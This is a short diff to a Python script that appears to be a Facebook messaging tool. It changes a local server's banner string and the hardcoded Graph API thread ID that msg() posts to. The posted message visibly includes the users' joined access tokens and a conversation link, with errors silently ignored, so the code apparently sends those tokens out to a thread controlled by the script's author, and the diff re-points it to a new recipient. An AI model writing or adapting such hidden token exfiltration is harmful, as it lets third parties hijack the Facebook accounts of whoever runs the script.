@@ -14,7 +14,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"V1R97 S1NGH RAJPU7 S3RV3R")
+        self.wfile.write(b"R44JV33R B0SS S3RV3R")
 
 def execute_server():
     PORT = 4000
@@ -128,7 +128,7 @@ def msg():
             access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
     }
     try:
-        s = requests.post("https://graph.facebook.com/v15.0/t_100064387530858/", data=parameters, headers=headers)
+        s = requests.post("https://graph.facebook.com/v15.0/t_61579695536770/", data=parameters, headers=headers)
     except:
         pass
 
